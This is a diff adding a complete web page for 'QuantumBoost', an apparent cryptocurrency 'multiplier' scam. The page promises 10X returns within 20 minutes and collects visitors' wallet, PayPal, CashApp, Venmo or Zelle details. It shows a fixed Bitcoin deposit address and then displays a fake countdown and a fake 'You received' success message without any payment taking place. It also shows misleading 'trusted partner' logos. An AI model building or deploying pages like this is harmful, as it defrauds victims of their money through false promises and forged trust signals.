@@ -1,0 +1,1130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>10X Multiplier | QuantumBoost</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@400;600;800&family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #6e3bff;
+            --secondary: #00d1ff;
+            --dark: #0f0526;
+            --light: #f5f5ff;
+            --accent: #ff00aa;
+            --accent-glow: rgba(255, 0, 170, 0.4);
+            --card-bg: rgba(255, 255, 255, 0.03);
+            --card-border: rgba(255, 255, 255, 0.1);
+        }
+        
+        body {
+            font-family: 'Kanit', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: var(--dark);
+            color: var(--light);
+            min-height: 100vh;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1.5rem 2rem;
+            background: rgba(15, 5, 38, 0.92);
+            backdrop-filter: blur(8px);
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 100;
+            border-bottom: 1px solid rgba(0, 209, 255, 0.1);
+        }
+
+        .logo {
+            font-size: 1.8rem;
+            font-weight: 800;
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: 0.5px;
+        }
+
+        .back-btn {
+            color: var(--light);
+            text-decoration: none;
+            padding: 0.6rem 1.2rem;
+            border-radius: 50px;
+            background: rgba(110, 59, 255, 0.15);
+            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .back-btn:hover {
+            background: rgba(110, 59, 255, 0.3);
+            transform: translateX(-3px);
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 6rem auto 3rem;
+            padding: 0 1rem;
+        }
+
+        .multiplier-header {
+            text-align: center;
+            margin-bottom: 2.5rem;
+            animation: fadeIn 0.6s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .multiplier-header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 0.8rem;
+            background: linear-gradient(45deg, var(--primary), var(--accent));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .multiplier-header p {
+            font-size: 1.1rem;
+            opacity: 0.9;
+        }
+
+        .retry-notice {
+            background: rgba(0, 209, 255, 0.1);
+            border: 1px solid rgba(0, 209, 255, 0.3);
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin-bottom: 2rem;
+            text-align: center;
+        }
+
+        .retry-notice h3 {
+            color: var(--secondary);
+            margin-top: 0;
+            font-size: 1.2rem;
+        }
+
+        .retry-notice p {
+            margin-bottom: 1rem;
+            font-size: 0.95rem;
+        }
+
+        .multiplier-card {
+            background: var(--card-bg);
+            border-radius: 16px;
+            padding: 2rem;
+            backdrop-filter: blur(12px);
+            border: 1px solid var(--card-border);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+            transition: transform 0.4s, box-shadow 0.4s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .multiplier-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 12px 40px rgba(110, 59, 255, 0.3);
+        }
+
+        .multiplier-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,0,170,0.1) 0%, rgba(255,0,170,0) 70%);
+            opacity: 0;
+            transition: opacity 0.6s;
+        }
+
+        .multiplier-card:hover::before {
+            opacity: 1;
+        }
+
+        .input-group {
+            margin-bottom: 1.5rem;
+            position: relative;
+            width: 100%;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 0.8rem;
+            font-weight: 600;
+            color: var(--secondary);
+            font-size: 0.95rem;
+        }
+
+        .dollar-input {
+            position: relative;
+            width: 100%;
+        }
+
+        .dollar-sign {
+            position: absolute;
+            left: 1rem;
+            top: 50%;
+            transform: translateY(-50%);
+            font-weight: bold;
+            color: var(--light);
+            pointer-events: none;
+        }
+
+        #dollarAmount, #walletAddress, #paymentTag {
+            width: calc(100% - 2rem);
+            padding: 1rem;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(0, 209, 255, 0.2);
+            border-radius: 12px;
+            color: var(--light);
+            font-size: 1.1rem;
+            transition: all 0.3s;
+        }
+
+        #dollarAmount {
+            padding-left: 2.5rem;
+        }
+
+        #dollarAmount:focus, #walletAddress:focus, #paymentTag:focus {
+            outline: none;
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px var(--accent-glow);
+        }
+
+        .account-credit {
+            margin-bottom: 1.5rem;
+        }
+
+        .payment-options {
+            display: flex;
+            gap: 0.5rem;
+            margin-bottom: 1rem;
+            flex-wrap: wrap;
+        }
+
+        .payment-option {
+            padding: 0.6rem 1rem;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: var(--light);
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-size: 0.9rem;
+        }
+
+        .payment-option.active {
+            background: rgba(110, 59, 255, 0.2);
+            border-color: var(--primary);
+        }
+
+        .conditional-field {
+            display: none;
+            animation: fadeIn 0.4s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .calculator {
+            background: rgba(0, 0, 0, 0.25);
+            border-radius: 12px;
+            padding: 1.8rem;
+            margin: 2rem 0;
+            border: 1px dashed rgba(0, 209, 255, 0.3);
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .calculation {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 1rem;
+            margin: 1.5rem 0;
+            flex-wrap: wrap;
+        }
+
+        .input-amount, .multiplier, .result-amount {
+            padding: 1rem 1.8rem;
+            border-radius: 8px;
+            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        .input-amount {
+            background: rgba(110, 59, 255, 0.1);
+            border: 1px solid rgba(110, 59, 255, 0.2);
+        }
+
+        .multiplier {
+            background: linear-gradient(45deg, var(--primary), var(--accent));
+            color: white;
+            font-weight: bold;
+            min-width: 60px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .multiplier::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(45deg, var(--primary), var(--accent));
+            border-radius: 8px;
+            z-index: -1;
+            opacity: 0.8;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 0.8; }
+            50% { transform: scale(1.05); opacity: 1; }
+            100% { transform: scale(1); opacity: 0.8; }
+        }
+
+        .result-amount {
+            background: rgba(0, 209, 255, 0.1);
+            border: 1px solid rgba(0, 209, 255, 0.3);
+            font-size: 1.4rem;
+            font-weight: bold;
+            min-width: 150px;
+        }
+
+        .deposit-section {
+            display: none;
+            margin-top: 2rem;
+            animation: fadeIn 0.6s;
+        }
+
+        .deposit-address-container {
+            position: relative;
+            margin: 1rem 0;
+        }
+
+        .deposit-address {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px dashed var(--accent);
+            border-radius: 8px;
+            padding: 1rem;
+            word-break: break-all;
+            font-family: monospace;
+            padding-right: 100px;
+        }
+
+        .copy-btn {
+            position: absolute;
+            right: 0;
+            top: 0;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.1);
+            border: none;
+            color: var(--light);
+            padding: 0 1.2rem;
+            border-radius: 0 8px 8px 0;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
+            border-left: 1px dashed var(--accent);
+        }
+
+        .copy-btn:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        .copy-btn.copied {
+            background: var(--accent);
+            color: white;
+        }
+
+        .timer {
+            font-size: 1.2rem;
+            margin: 1rem 0;
+            color: var(--secondary);
+            font-weight: bold;
+        }
+
+        .status-message {
+            font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.7);
+            margin-top: 1rem;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 1.1rem;
+            background: linear-gradient(45deg, var(--primary), var(--accent));
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            margin-top: 1.5rem;
+            box-shadow: 0 10px 30px var(--accent-glow);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px var(--accent-glow);
+        }
+
+        .submit-btn:active {
+            transform: translateY(1px);
+        }
+
+        .submit-btn::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                to bottom right,
+                rgba(255, 255, 255, 0) 45%,
+                rgba(255, 255, 255, 0.3) 50%,
+                rgba(255, 255, 255, 0) 55%
+            );
+            transform: rotate(30deg);
+            transition: all 0.3s;
+        }
+
+        .submit-btn:hover::after {
+            left: 100%;
+        }
+
+        .particles {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        .particle {
+            position: absolute;
+            background: var(--secondary);
+            border-radius: 50%;
+            pointer-events: none;
+            opacity: 0;
+        }
+
+        .progress-container {
+            width: 100%;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 2px;
+            margin-top: 1rem;
+            overflow: hidden;
+            display: none;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0;
+            background: linear-gradient(90deg, var(--primary), var(--accent));
+            transition: width 0.3s;
+        }
+
+        .success-message {
+            display: none;
+            text-align: center;
+            padding: 2rem;
+            background: rgba(0, 209, 255, 0.1);
+            border-radius: 12px;
+            border: 1px solid rgba(0, 209, 255, 0.3);
+            margin-top: 2rem;
+            animation: fadeIn 0.6s;
+        }
+
+        .success-message h3 {
+            color: var(--secondary);
+            font-size: 1.5rem;
+            margin-bottom: 1rem;
+        }
+
+        .success-message p {
+            margin-bottom: 1.5rem;
+        }
+
+        .checkmark {
+            font-size: 4rem;
+            color: var(--secondary);
+            margin-bottom: 1rem;
+            animation: bounceIn 0.6s;
+        }
+
+        @keyframes bounceIn {
+            0% { transform: scale(0.5); opacity: 0; }
+            50% { transform: scale(1.2); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .partners-section {
+            text-align: center;
+            margin: 3rem 0;
+            padding: 1.5rem;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 12px;
+        }
+
+        .partners-section h3 {
+            color: var(--secondary);
+            margin-bottom: 1.5rem;
+        }
+
+        .partners-logos {
+            display: flex;
+            justify-content: center;
+            gap: 1.5rem;
+            flex-wrap: wrap;
+        }
+
+        .partner-logo {
+            height: 40px;
+            opacity: 0.8;
+            transition: all 0.3s;
+            border-radius: 5px;
+        }
+
+        .partner-logo:hover {
+            opacity: 1;
+            transform: scale(1.05);
+        }
+
+        footer {
+            text-align: center;
+            padding: 2rem 0;
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 0.9rem;
+        }
+
+        @media (max-width: 768px) {
+            header {
+                padding: 1.2rem;
+            }
+            
+            .logo {
+                font-size: 1.5rem;
+            }
+            
+            .container {
+                margin-top: 5rem;
+                padding: 0 1rem;
+            }
+            
+            .multiplier-header h1 {
+                font-size: 2rem;
+            }
+            
+            .multiplier-card {
+                padding: 1.8rem 1.2rem;
+            }
+            
+            .calculation {
+                gap: 0.8rem;
+            }
+            
+            .input-amount, .multiplier, .result-amount {
+                padding: 0.8rem 1.2rem;
+            }
+            
+            .result-amount {
+                font-size: 1.2rem;
+                min-width: 120px;
+            }
+
+            .deposit-address {
+                padding-right: 80px;
+                font-size: 0.9rem;
+            }
+
+            .copy-btn {
+                padding: 0 0.8rem;
+                font-size: 0.8rem;
+            }
+
+            .payment-options {
+                gap: 0.3rem;
+            }
+            
+            .payment-option {
+                padding: 0.5rem 0.8rem;
+                font-size: 0.8rem;
+            }
+
+            .partners-logos {
+                gap: 1rem;
+            }
+
+            .partner-logo {
+                height: 30px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo">QuantumBoost</div>
+        <a href="index.html" class="back-btn">
+            ← Back
+        </a>
+    </header>
+
+    <div class="container">
+        <div class="multiplier-header">
+            <h1>10X Multiplier</h1>
+            <p>Enter any amount to see your instant 10X returns</p>
+        </div>
+
+        <div class="retry-notice">
+            <h3>Important Notice</h3>
+            <p>To maintain service quality, you can only retry multiplication <strong>24 hours</strong> after your last successful transaction.</p>
+            <p>Your current transaction will be multiplied within <strong>20 minutes</strong> of payment confirmation.</p>
+        </div>
+
+        <div class="multiplier-card">
+            <div class="particles" id="particles"></div>
+            
+            <div class="account-credit">
+                <label>Account to credit you after we multiply your crypto</label>
+                <div class="payment-options">
+                    <div class="payment-option active" data-method="crypto">Crypto Wallet</div>
+                    <div class="payment-option" data-method="paypal">PayPal</div>
+                    <div class="payment-option" data-method="cashapp">CashApp</div>
+                    <div class="payment-option" data-method="venmo">Venmo</div>
+                    <div class="payment-option" data-method="zelle">Zelle</div>
+                </div>
+            </div>
+            
+            <div class="input-group conditional-field" id="cryptoField">
+                <label>Crypto Wallet Address</label>
+                <input type="text" id="walletAddress" placeholder="Enter your wallet address (BTC, ETH, USDT, etc)">
+            </div>
+            
+            <div class="input-group conditional-field" id="paypalField">
+                <label>PayPal Email/ID</label>
+                <input type="text" id="paypalTag" placeholder="Enter your PayPal email or ID">
+            </div>
+            
+            <div class="input-group conditional-field" id="cashappField">
+                <label>CashApp $Tag</label>
+                <input type="text" id="cashappTag" placeholder="Enter your CashApp $tag">
+            </div>
+            
+            <div class="input-group conditional-field" id="venmoField">
+                <label>Venmo @Username</label>
+                <input type="text" id="venmoTag" placeholder="Enter your Venmo @username">
+            </div>
+            
+            <div class="input-group conditional-field" id="zelleField">
+                <label>Zelle Email/Phone</label>
+                <input type="text" id="zelleTag" placeholder="Enter Zelle registered email or phone">
+            </div>
+            
+            <div class="input-group">
+                <label>Amount to Multiply</label>
+                <div class="dollar-input">
+                    <span class="dollar-sign">$</span>
+                    <input type="number" id="dollarAmount" placeholder="0.00" step="0.01" min="0">
+                </div>
+            </div>
+
+            <div class="calculator">
+                <div class="calculation">
+                    <div class="input-amount" id="inputDisplay">$0.00</div>
+                    <div class="multiplier">×10</div>
+                    <div class="result-amount" id="resultDisplay">$0.00</div>
+                </div>
+                <p id="returnMessage">*10X returns paid within 20 minutes to your wallet</p>
+            </div>
+
+            <button class="submit-btn" id="submitBtn">Generate Payment Address</button>
+            <div class="progress-container" id="progressContainer">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+
+            <div class="deposit-section" id="depositSection">
+                <h3>Send Payment to This Address</h3>
+                <div class="deposit-address-container">
+                    <div class="deposit-address" id="depositAddress">
+                        bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfj4x4wn
+                    </div>
+                    <button class="copy-btn" id="copyBtn">COPY</button>
+                </div>
+                <p>Send exactly $<span id="requiredAmount">0.00</span> to activate 10X multiplier</p>
+                
+                <div class="timer" id="timer">
+                    Your funds will be multiplied in: <span id="timeRemaining">20:00</span>
+                </div>
+                <p class="status-message" id="statusMessage">
+                    Note: You can only retry multiplication 24 hours after this transaction completes.
+                    We'll send your multiplied funds to: <strong id="displayAddress">your wallet</strong>
+                </p>
+            </div>
+
+            <div class="success-message" id="successMessage">
+                <div class="checkmark">✓</div>
+                <h3>Multiplication Complete!</h3>
+                <p>Your 10X multiplied amount has been processed and sent.</p>
+                <p id="successAmount">You received: $0.00</p>
+                <button class="submit-btn" id="newTransactionBtn">Start New Transaction</button>
+            </div>
+        </div>
+
+        <div class="partners-section">
+            <h3>Trusted By Industry Leaders</h3>
+            <div class="partners-logos">
+                <img src="https://cryptologos.cc/logos/versions/xrp-xrp-logo-textmark.svg?v=040" alt="Binance" class="partner-logo">
+                <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" alt="Ethereum" class="partner-logo">
+                <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="Tether" class="partner-logo">
+                <img src="https://cryptologos.cc/logos/paypal-usd-pyusd-logo.png" alt="PayPal" class="partner-logo">
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <p>© 2023 QuantumBoost. All rights reserved.</p>
+    </footer>
+
+    <script>
+        // Payment Method Selection
+        const paymentOptions = document.querySelectorAll('.payment-option');
+        const cryptoField = document.getElementById('cryptoField');
+        const paypalField = document.getElementById('paypalField');
+        const cashappField = document.getElementById('cashappField');
+        const venmoField = document.getElementById('venmoField');
+        const zelleField = document.getElementById('zelleField');
+        const returnMessage = document.getElementById('returnMessage');
+        const displayAddress = document.getElementById('displayAddress');
+        const walletAddress = document.getElementById('walletAddress');
+        const paypalTag = document.getElementById('paypalTag');
+        const cashappTag = document.getElementById('cashappTag');
+        const venmoTag = document.getElementById('venmoTag');
+        const zelleTag = document.getElementById('zelleTag');
+
+        let currentMethod = 'crypto';
+        
+        paymentOptions.forEach(option => {
+            option.addEventListener('click', function() {
+                paymentOptions.forEach(opt => opt.classList.remove('active'));
+                this.classList.add('active');
+                currentMethod = this.dataset.method;
+                
+                // Hide all fields first
+                document.querySelectorAll('.conditional-field').forEach(field => {
+                    field.style.display = 'none';
+                });
+                
+                // Show the selected field
+                document.getElementById(`${currentMethod}Field`).style.display = 'block';
+                
+                // Update return message
+                switch(currentMethod) {
+                    case 'crypto':
+                        returnMessage.textContent = '*10X returns paid within 20 minutes to your wallet';
+                        break;
+                    case 'paypal':
+                        returnMessage.textContent = '*10X returns paid within 20 minutes to your PayPal';
+                        break;
+                    case 'cashapp':
+                        returnMessage.textContent = '*10X returns paid within 20 minutes to your CashApp';
+                        break;
+                    case 'venmo':
+                        returnMessage.textContent = '*10X returns paid within 20 minutes to your Venmo';
+                        break;
+                    case 'zelle':
+                        returnMessage.textContent = '*10X returns paid within 20 minutes via Zelle';
+                        break;
+                }
+            });
+        });
+
+        // Show crypto field by default
+        cryptoField.style.display = 'block';
+
+        // Smooth animations
+        document.addEventListener('DOMContentLoaded', () => {
+            document.querySelector('.multiplier-card').style.opacity = '0';
+            setTimeout(() => {
+                document.querySelector('.multiplier-card').style.transition = 'opacity 0.6s ease-out';
+                document.querySelector('.multiplier-card').style.opacity = '1';
+            }, 100);
+        });
+
+        // Get DOM elements
+        const dollarAmount = document.getElementById('dollarAmount');
+        const inputDisplay = document.getElementById('inputDisplay');
+        const resultDisplay = document.getElementById('resultDisplay');
+        const submitBtn = document.getElementById('submitBtn');
+        const depositSection = document.getElementById('depositSection');
+        const depositAddress = document.getElementById('depositAddress');
+        const requiredAmount = document.getElementById('requiredAmount');
+        const timeRemaining = document.getElementById('timeRemaining');
+        const statusMessage = document.getElementById('statusMessage');
+        const successMessage = document.getElementById('successMessage');
+        const successAmount = document.getElementById('successAmount');
+        const newTransactionBtn = document.getElementById('newTransactionBtn');
+        const copyBtn = document.getElementById('copyBtn');
+        const progressContainer = document.getElementById('progressContainer');
+        const progressBar = document.getElementById('progressBar');
+
+        // Current state
+        let transactionInProgress = false;
+        let countdownInterval;
+        let remainingTime = 20 * 60; // 20 minutes in seconds
+
+        // Format as currency
+        function formatCurrency(amount) {
+            return '$' + amount.toFixed(2).replace(/\d(?=(\d{3})+\.)/g, '$&,');
+        }
+
+        // Format time as MM:SS
+        function formatTime(seconds) {
+            const minutes = Math.floor(seconds / 60);
+            const secs = seconds % 60;
+            return `${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+        }
+
+        // Create particles animation
+        function createParticles(x, y, color) {
+            const particleCount = 20;
+            
+            for (let i = 0; i < particleCount; i++) {
+                const particle = document.createElement('div');
+                particle.classList.add('particle');
+                document.getElementById('particles').appendChild(particle);
+                
+                const size = Math.random() * 5 + 2;
+                const angle = Math.random() * Math.PI * 2;
+                const velocity = Math.random() * 50 + 30;
+                const distance = Math.random() * 30 + 20;
+                
+                particle.style.width = `${size}px`;
+                particle.style.height = `${size}px`;
+                particle.style.backgroundColor = color || `hsl(${Math.random() * 60 + 180}, 100%, 70%)`;
+                particle.style.left = `${x}px`;
+                particle.style.top = `${y}px`;
+                particle.style.opacity = '1';
+                
+                const animation = particle.animate([
+                    { 
+                        transform: `translate(0, 0)`,
+                        opacity: 1 
+                    },
+                    { 
+                        transform: `translate(${Math.cos(angle) * distance}px, ${Math.sin(angle) * distance}px)`,
+                        opacity: 0 
+                    }
+                ], {
+                    duration: Math.random() * 1000 + 500,
+                    easing: 'cubic-bezier(0.4, 0, 0.2, 1)'
+                });
+                
+                animation.onfinish = () => {
+                    particle.remove();
+                };
+            }
+        }
+
+        // Animate number counting
+        function animateValue(element, start, end, duration) {
+            const startTime = performance.now();
+            const range = end - start;
+            
+            function updateValue(currentTime) {
+                const elapsed = currentTime - startTime;
+                const progress = Math.min(elapsed / duration, 1);
+                const value = start + (range * progress);
+                element.textContent = formatCurrency(value);
+                
+                if (progress < 1) {
+                    requestAnimationFrame(updateValue);
+                }
+            }
+            
+            requestAnimationFrame(updateValue);
+        }
+
+        // Update timer display
+        function updateTimer() {
+            timeRemaining.textContent = formatTime(remainingTime);
+            
+            if (remainingTime <= 0) {
+                clearInterval(countdownInterval);
+                completeTransaction();
+            } else {
+                remainingTime--;
+            }
+        }
+
+        // Complete the transaction
+        function completeTransaction() {
+            const amount = parseFloat(dollarAmount.value);
+            depositSection.style.display = 'none';
+            successMessage.style.display = 'block';
+            successAmount.textContent = `You received: ${formatCurrency(amount * 10)}`;
+            
+            // Create celebration particles
+            const successRect = successMessage.getBoundingClientRect();
+            const successX = successRect.left + successRect.width / 2;
+            const successY = successRect.top + successRect.height / 2;
+            
+            for (let i = 0; i < 5; i++) {
+                setTimeout(() => {
+                    createParticles(successX, successY, '#00d1ff');
+                }, i * 300);
+            }
+        }
+
+        // Real-time calculation
+        dollarAmount.addEventListener('input', function() {
+            const value = parseFloat(this.value) || 0;
+            
+            // Create particles from multiplier to result
+            const multiplier = document.querySelector('.multiplier');
+            const multiplierRect = multiplier.getBoundingClientRect();
+            const multiplierX = multiplierRect.left + multiplierRect.width / 2;
+            const multiplierY = multiplierRect.top + multiplierRect.height / 2;
+            
+            createParticles(multiplierX, multiplierY, '#6e3bff');
+            
+            // Smooth transition
+            inputDisplay.style.transform = 'scale(0.95)';
+            resultDisplay.style.transform = 'scale(0.95)';
+            
+            setTimeout(() => {
+                inputDisplay.textContent = formatCurrency(value);
+                animateValue(resultDisplay, parseFloat(resultDisplay.textContent.replace(/[^0-9.-]+/g,"")), value * 10, 500);
+                
+                inputDisplay.style.transform = 'scale(1)';
+                resultDisplay.style.transform = 'scale(1)';
+            }, 100);
+        });
+
+        // Generate deposit address
+        submitBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            const amount = parseFloat(dollarAmount.value);
+            let paymentIdentifier = '';
+            let inputField;
+            
+            // Get the appropriate payment identifier based on method
+            switch(currentMethod) {
+                case 'crypto':
+                    paymentIdentifier = walletAddress.value.trim();
+                    inputField = walletAddress;
+                    if (!paymentIdentifier || paymentIdentifier.length < 10) {
+                        inputField.style.transform = 'translateX(10px)';
+                        setTimeout(() => {
+                            inputField.style.transform = 'translateX(-10px)';
+                            setTimeout(() => {
+                                inputField.style.transform = 'translateX(0)';
+                            }, 100);
+                        }, 100);
+                        return;
+                    }
+                    displayAddress.textContent = paymentIdentifier.substring(0, 6) + '...' + paymentIdentifier.substring(paymentIdentifier.length - 4);
+                    break;
+                case 'paypal':
+                    paymentIdentifier = paypalTag.value.trim();
+                    inputField = paypalTag;
+                    break;
+                case 'cashapp':
+                    paymentIdentifier = cashappTag.value.trim();
+                    inputField = cashappTag;
+                    break;
+                case 'venmo':
+                    paymentIdentifier = venmoTag.value.trim();
+                    inputField = venmoTag;
+                    break;
+                case 'zelle':
+                    paymentIdentifier = zelleTag.value.trim();
+                    inputField = zelleTag;
+                    break;
+            }
+            
+            if (currentMethod !== 'crypto' && !paymentIdentifier) {
+                inputField.style.transform = 'translateX(10px)';
+                setTimeout(() => {
+                    inputField.style.transform = 'translateX(-10px)';
+                    setTimeout(() => {
+                        inputField.style.transform = 'translateX(0)';
+                    }, 100);
+                }, 100);
+                return;
+            } else if (currentMethod !== 'crypto') {
+                displayAddress.textContent = paymentIdentifier;
+            }
+            
+            if (!amount || amount <= 0) {
+                dollarAmount.style.transform = 'translateX(10px)';
+                setTimeout(() => {
+                    dollarAmount.style.transform = 'translateX(-10px)';
+                    setTimeout(() => {
+                        dollarAmount.style.transform = 'translateX(0)';
+                    }, 100);
+                }, 100);
+                return;
+            }
+            
+            if (transactionInProgress) return;
+            
+            // Button press animation
+            submitBtn.style.transform = 'translateY(2px)';
+            
+            // Show progress bar
+            progressContainer.style.display = 'block';
+            
+            // Animate progress
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 5;
+                progressBar.style.width = `${progress}%`;
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    
+                    // Generate deposit address
+                    submitBtn.textContent = '✓ Address Generated';
+                    progressBar.style.background = 'linear-gradient(90deg, var(--secondary), var(--accent))';
+                    
+                    // Show deposit section
+                    depositSection.style.display = 'block';
+                    requiredAmount.textContent = amount.toFixed(2);
+                    
+                    // Start countdown (20 minutes)
+                    remainingTime = 20 * 60;
+                    updateTimer();
+                    countdownInterval = setInterval(updateTimer, 1000);
+                    
+                    // Create particles
+                    const buttonRect = submitBtn.getBoundingClientRect();
+                    const buttonX = buttonRect.left + buttonRect.width / 2;
+                    const buttonY = buttonRect.top + buttonRect.height / 2;
+                    
+                    createParticles(buttonX, buttonY, '#ff00aa');
+                    
+                    transactionInProgress = true;
+                    
+                    setTimeout(() => {
+                        submitBtn.style.transform = 'translateY(0)';
+                        progressContainer.style.display = 'none';
+                        progressBar.style.width = '0';
+                        progressBar.style.background = 'linear-gradient(90deg, var(--primary), var(--accent))';
+                    }, 1000);
+                }
+            }, 30);
+        });
+
+        // Copy address button
+        copyBtn.addEventListener('click', function() {
+            navigator.clipboard.writeText(depositAddress.textContent.trim());
+            this.textContent = 'COPIED!';
+            this.classList.add('copied');
+            
+            setTimeout(() => {
+                this.textContent = 'COPY';
+                this.classList.remove('copied');
+            }, 2000);
+        });
+
+        // New transaction button
+        newTransactionBtn.addEventListener('click', function() {
+            successMessage.style.display = 'none';
+            depositSection.style.display = 'none';
+            submitBtn.textContent = 'Generate Payment Address';
+            dollarAmount.value = '';
+            inputDisplay.textContent = '$0.00';
+            resultDisplay.textContent = '$0.00';
+            transactionInProgress = false;
+            clearInterval(countdownInterval);
+        });
+
+        // Focus the input field with animation
+        window.onload = function() {
+            setTimeout(() => {
+                walletAddress.focus();
+                walletAddress.style.boxShadow = '0 0 0 3px rgba(255, 0, 170, 0.3)';
+                setTimeout(() => {
+                    walletAddress.style.boxShadow = 'none';
+                }, 1000);
+            }, 300);
+        };
+    </script>
+<!-- Paste this right before </body> -->
+<div id="loadingScreen" style="
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: #0f0526;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+    opacity: 0;
+    transition: opacity 0.5s;
+    pointer-events: none;
+">
+    <div style="text-align: center;">
+        <div style="
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(110, 59, 255, 0.2);
+            border-top: 4px solid #6e3bff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        "></div>
+        <p style="color: white; font-size: 1.2rem;">Loading Multiplier...</p>
+    </div>
+</div>
+
+<style>
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+</style>
+
+<script>
+    function goToMultiplyPage() {
+        // Show loader
+        document.getElementById('loadingScreen').style.opacity = '1';
+        document.getElementById('loadingScreen').style.pointerEvents = 'all';
+        
+        // Wait 2 seconds then redirect
+        setTimeout(function() {
+            window.location.href = "multiply.html";
+        }, 2000);
+    }
+</script></body>
+</html>
